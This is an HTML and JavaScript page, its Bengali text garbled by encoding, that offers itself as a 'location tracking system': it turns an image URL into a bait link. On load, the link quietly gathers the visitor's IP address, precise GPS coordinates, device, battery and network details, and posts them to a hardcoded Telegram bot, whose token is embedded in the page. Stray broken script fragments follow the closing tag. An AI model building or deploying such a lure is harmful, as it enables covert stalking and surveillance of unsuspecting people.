<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶ø‡¶Ç ‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            padding: 30px;
            width: 100%;
            max-width: 500px;
        }
        
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 10px;
            font-size: 24px;
        }
        
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        
        input[type="url"], input[type="text"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 25px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s;
        }
        
        button:hover {
            transform: translateY(-2px);
        }
        
        .hidden {
            display: none;
        }
        
        #result {
            margin-top: 25px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        
        #generatedLink {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin: 10px 0;
            background: white;
            word-break: break-all;
        }
        
        .copy-btn {
            background: #28a745;
            margin-top: 10px;
        }
        
        .status {
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            text-align: center;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .preview-image {
            width: 100%;
            max-height: 200px;
            object-fit: cover;
            border-radius: 8px;
            margin: 10px 0;
            border: 2px solid #e1e5e9;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üìç ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶ø‡¶Ç ‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ</h1>
        <p class="subtitle">‡¶Ø‡ßá‡¶ï‡ßã‡¶®‡ßã ‡¶õ‡¶¨‡¶ø ‡¶¶‡¶ø‡¶Ø‡¶º‡ßá ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶ø‡¶Ç ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</p>
        
        <div id="form-container">
            <div class="form-group">
                <label for="imageUrl">‡¶õ‡¶¨‡¶ø‡¶∞ URL:</label>
                <input type="url" id="imageUrl" placeholder="https://example.com/image.jpg" required>
            </div>
            
            <div class="form-group">
                <label for="pageTitle">‡¶™‡ßá‡¶ú ‡¶ü‡¶æ‡¶á‡¶ü‡ßá‡¶≤ (‡¶ê‡¶ö‡ßç‡¶õ‡¶ø‡¶ï):</label>
                <input type="text" id="pageTitle" placeholder="‡¶Æ‡¶ú‡¶æ‡¶∞ ‡¶õ‡¶¨‡¶ø ‡¶¶‡ßá‡¶ñ‡ßÅ‡¶®...">
            </div>
            
            <button id="generateBtn">‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        </div>
        
        <div id="result" class="hidden">
            <h3>‚úÖ ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶ø‡¶Ç ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!</h3>
            <p>‡¶è‡¶á ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ü‡¶ø ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®:</p>
            <input type="text" id="generatedLink" readonly>
            <button class="copy-btn" id="copyBtn">‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
            
            <div class="status hidden" id="statusMessage"></div>
            
            <div id="previewContainer" class="hidden">
                <h4>‡¶™‡ßç‡¶∞‡¶ø‡¶≠‡¶ø‡¶â:</h4>
                <img id="previewImage" class="preview-image" alt="Preview">
            </div>
        </div>
    </div>

    <script>
        // ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶¨‡¶ü ‡¶∏‡ßá‡¶ü‡¶ø‡¶Ç‡¶∏
        const TELEGRAM_BOT_TOKEN = "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk";
        const TELEGRAM_CHAT_ID = "2139008203";

        document.getElementById('generateBtn').addEventListener('click', generateTrackingLink);
        document.getElementById('copyBtn').addEventListener('click', copyLink);

        async function generateTrackingLink() {
            const imageUrl = document.getElementById('imageUrl').value;
            const pageTitle = document.getElementById('pageTitle').value || '‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶õ‡¶¨‡¶ø';
            
            if (!imageUrl) {
                showStatus('‡¶¶‡¶Ø‡¶º‡¶æ ‡¶ï‡¶∞‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶õ‡¶¨‡¶ø‡¶∞ URL ‡¶¶‡¶ø‡¶®', 'error');
                return;
            }

            // URL ‡¶™‡ßç‡¶Ø‡¶æ‡¶∞‡¶æ‡¶Æ‡¶ø‡¶ü‡¶æ‡¶∞ ‡¶§‡ßà‡¶∞‡¶ø
            const params = new URLSearchParams({
                image: imageUrl,
                title: pageTitle,
                time: Date.now()
            });

            // ‡¶¨‡¶∞‡ßç‡¶§‡¶Æ‡¶æ‡¶® ‡¶™‡ßá‡¶ú‡ßá‡¶∞ ‡¶¨‡ßá‡¶∏ URL
            const baseUrl = window.location.href.split('?')[0];
            const trackingUrl = `${baseUrl}?track=${btoa(params.toString())}`;

            // ‡¶∞‡ßá‡¶ú‡¶æ‡¶≤‡ßç‡¶ü ‡¶∂‡ßã ‡¶ï‡¶∞‡¶æ
            document.getElementById('generatedLink').value = trackingUrl;
            document.getElementById('form-container').classList.add('hidden');
            document.getElementById('result').classList.remove('hidden');

            // ‡¶õ‡¶¨‡¶ø ‡¶™‡ßç‡¶∞‡¶ø‡¶≠‡¶ø‡¶â
            document.getElementById('previewImage').src = imageUrl;
            document.getElementById('previewContainer').classList.remove('hidden');

            showStatus('‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶∏‡¶´‡¶≤! ‡¶è‡¶ñ‡¶® ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ü‡¶ø ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§', 'success');
        }

        function copyLink() {
            const linkInput = document.getElementById('generatedLink');
            linkInput.select();
            navigator.clipboard.writeText(linkInput.value)
                .then(() => showStatus('‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!', 'success'))
                .catch(() => showStatus('‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶§‡ßá ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá', 'error'));
        }

        function showStatus(message, type) {
            const statusElement = document.getElementById('statusMessage');
            statusElement.textContent = message;
            statusElement.className = `status ${type}`;
            statusElement.classList.remove('hidden');
            
            setTimeout(() => {
                statusElement.classList.add('hidden');
            }, 3000);
        }

        // ‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶° ‡¶π‡¶≤‡ßá ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡¶æ ‡¶Ø‡ßá ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶ø‡¶Ç ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶•‡ßá‡¶ï‡ßá ‡¶è‡¶∏‡ßá‡¶õ‡ßá ‡¶ï‡¶ø‡¶®‡¶æ
        window.addEventListener('load', function() {
            const urlParams = new URLSearchParams(window.location.search);
            const trackParam = urlParams.get('track');
            
            if (trackParam) {
                // ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶ø‡¶Ç ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶•‡ßá‡¶ï‡ßá ‡¶è‡¶∏‡ßá‡¶õ‡ßá - ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ì ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡ßã ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π
                showImagePage(trackParam);
                collectAndSendLocation();
            }
        });

        async function showImagePage(trackParam) {
            try {
                const decodedParams = atob(trackParam);
                const params = new URLSearchParams(decodedParams);
                const imageUrl = params.get('image');
                const pageTitle = params.get('title');

                // ‡¶™‡ßá‡¶ú ‡¶ï‡¶®‡ßç‡¶ü‡ßá‡¶®‡ßç‡¶ü ‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶®
                document.body.innerHTML = `
                    <div class="container">
                        <h1>${pageTitle}</h1>
                        <img src="${imageUrl}" class="preview-image" alt="${pageTitle}">
                        <p style="text-align: center; margin-top: 15px; color: #666;">
                            ‡¶õ‡¶¨‡¶ø‡¶ü‡¶ø ‡¶≤‡ßã‡¶° ‡¶π‡¶ö‡ßç‡¶õ‡ßá...
                        </p>
                    </div>
                `;
            } catch (error) {
                console.error('Error showing image page:', error);
            }
        }

        async function collectAndSendLocation() {
            let locationData = '';
            
            try {
                // IP ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡ßç‡¶∞‡ßá‡¶∏ ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                locationData += `üåê **IP Address:** ${ipData.ip}\n\n`;
            } catch (error) {
                locationData += `üåê **IP Address:** ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø\n\n`;
            }

            try {
                // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });

                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                
                locationData += `üìç **‡¶∏‡¶†‡¶ø‡¶ï ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶®:**\n`;
                locationData += `- **‡¶Ö‡¶ï‡ßç‡¶∑‡¶æ‡¶Ç‡¶∂:** ${lat}\n`;
                locationData += `- **‡¶¶‡ßç‡¶∞‡¶æ‡¶ò‡¶ø‡¶Æ‡¶æ‡¶Ç‡¶∂:** ${lon}\n`;
                locationData += `- **‡¶∏‡¶†‡¶ø‡¶ï‡¶§‡¶æ:** ${accuracy} ‡¶Æ‡¶ø‡¶ü‡¶æ‡¶∞\n\n`;

                // Google Maps ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï
                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                locationData += `üó∫Ô∏è **Google Maps:** [‡¶≤‡¶ø‡¶ô‡ßç‡¶ï](${mapsLink})\n\n`;

            } catch (error) {
                locationData += `üìç **‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶®:** ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ï‡ßç‡¶∏‡ßá‡¶∏ ‡¶¶‡ßá‡¶ì‡¶Ø‡¶º‡¶æ ‡¶π‡¶Ø‡¶º‡¶®‡¶ø\n\n`;
            }

            // ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡¶∞‡¶Æ‡ßá‡¶∂‡¶®
            locationData += `üì± **‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶§‡¶•‡ßç‡¶Ø:**\n`;
            locationData += `- **User Agent:** ${navigator.userAgent}\n`;
            locationData += `- **‡¶™‡ßç‡¶≤‡ßç‡¶Ø‡¶æ‡¶ü‡¶´‡¶∞‡ßç‡¶Æ:** ${navigator.platform}\n`;
            locationData += `- **‡¶≠‡¶æ‡¶∑‡¶æ:** ${navigator.language}\n`;
            locationData += `- **‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡ßÄ‡¶®:** ${screen.width}x${screen.height}\n`;

            // ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∞‡¶ø ‡¶á‡¶®‡¶´‡ßã
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    locationData += `- **‡¶¨‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∞‡¶ø:** ${Math.round(battery.level * 100)}%`;
                    locationData += battery.charging ? ' (‡¶ö‡¶æ‡¶∞‡ßç‡¶ú ‡¶π‡¶ö‡ßç‡¶õ‡ßá)' : ' (‡¶ö‡¶æ‡¶∞‡ßç‡¶ú ‡¶π‡¶ö‡ßç‡¶õ‡ßá‡¶®‡¶æ)' + '\n';
                } catch (e) {
                    locationData += `- **‡¶¨‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∞‡¶ø:** ‡¶§‡¶•‡ßç‡¶Ø ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø\n`;
                }
            }

            // ‡¶®‡ßá‡¶ü‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶ï ‡¶á‡¶®‡¶´‡ßã
            if (navigator.connection) {
                const connection = navigator.connection;
                locationData += `- **‡¶®‡ßá‡¶ü‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶ï:** ${connection.effectiveType || '‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ'}\n`;
                locationData += `- **‡¶°‡¶æ‡¶â‡¶®‡¶≤‡ßã‡¶° ‡¶∏‡ßç‡¶™‡¶ø‡¶°:** ${connection.downlink || '‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ'} Mbps\n`;
            }

            // ‡¶∏‡¶Æ‡¶Ø‡¶º ‡¶è‡¶¨‡¶Ç URL
            locationData += `\n‚è∞ **‡¶∏‡¶Æ‡¶Ø‡¶º:** ${new Date().toLocaleString('bn-BD')}\n`;
            locationData += `üîó **URL:** ${window.location.href}\n`;

            // ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶°‡ßá‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
            await sendToTelegram(locationData);
        }

        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: `üö® **‡¶®‡¶§‡ßÅ‡¶® ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï** üö®\n\n${message}`,
                        parse_mode: 'Markdown'
                    })
                });

                if (!response.ok) {
                    throw new Error('Telegram API error');
                }

                console.log('Location data sent successfully');
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }
    </script>
</body>
</html>                        statusMessage.style.display = 'none';
                    }, 5000);
                }
            }
        });
    </script>
</body>
</html>

